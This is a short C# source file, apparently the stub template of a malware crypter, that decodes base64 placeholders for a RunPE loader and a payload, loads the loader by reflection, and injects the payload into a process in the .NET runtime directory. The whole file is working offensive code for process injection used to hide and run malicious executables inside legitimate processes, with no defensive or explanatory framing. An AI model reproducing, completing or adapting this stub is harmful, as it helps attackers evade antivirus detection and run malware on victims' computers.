using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Stub
{
    class Program
    {
        static void Main()
        {
            byte[] Runpe = Convert.FromBase64String("%RUNPE%");
            byte[] Payload = Convert.FromBase64String("%PAYLOAD%");
            string InjectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "%PROCESS%");

            if (Runpe.Length > 0 && Payload.Length > 0)
            {
                Assembly RunpeLoader = Assembly.Load(Runpe);
                MethodInfo MI = RunpeLoader.GetType("Runpe.Class1").GetMethod("Execute");
                object[] Params = new object[] { InjectionPath, Payload };
                MI.Invoke(null, Params);
            }
        }
    }
}
